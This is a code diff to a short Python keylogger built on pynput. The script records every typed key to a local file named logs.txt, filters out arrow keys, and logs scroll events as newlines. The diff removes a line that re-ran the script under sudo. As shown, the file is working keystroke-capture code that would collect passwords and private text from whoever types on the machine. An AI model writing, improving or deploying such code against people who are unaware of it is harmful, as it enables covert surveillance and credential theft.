@@ -1,24 +1,31 @@
-from datetime import datetime
-import os
-import sys
-from pynput.keyboard import Listener
+from pynput.keyboard import Key, Listener as KeyboardListener
+from pynput.mouse import Listener as MouseListener
 
-# Re-execute script with sudo privileges if not running as root
-if os.name == "posix" and os.geteuid() != 0:
-    os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
 
 def log_pressedkey(key):
-    key = str(key).replace("'", "")
+    # Ignore arrow keys
+    if key in [Key.up, Key.down, Key.left, Key.right]:
+        return
 
-    if key == 'Key.space':
-        key = ' '
-    elif key == 'Key.enter':
-        key = '\n'
-    elif key in ['Key.shift', 'Key.shift_r', 'Key.backspace']:
-        key = ''
+    k = str(key).replace("'", "")
+    
+    if k == "Key.space":
+        k = " "
+    elif k == "Key.enter":
+        k = "\n"
+    elif k in ["Key.shift", "Key.shift_r", "Key.backspace"]:
+        k = ""
 
+    if not k.startswith("Key."):
+        with open("logs.txt", "a") as f:
+            f.write(k)
+
+
+def on_scroll(x, y, dx, dy):
     with open("logs.txt", "a") as f:
-        f.write(key)
+        f.write("\n")
 
-with Listener(on_press=log_pressedkey) as l:
-    l.join()
+
+KeyboardListener(on_press=log_pressedkey).start()
+with MouseListener(on_scroll=on_scroll) as ml:
+    ml.join()
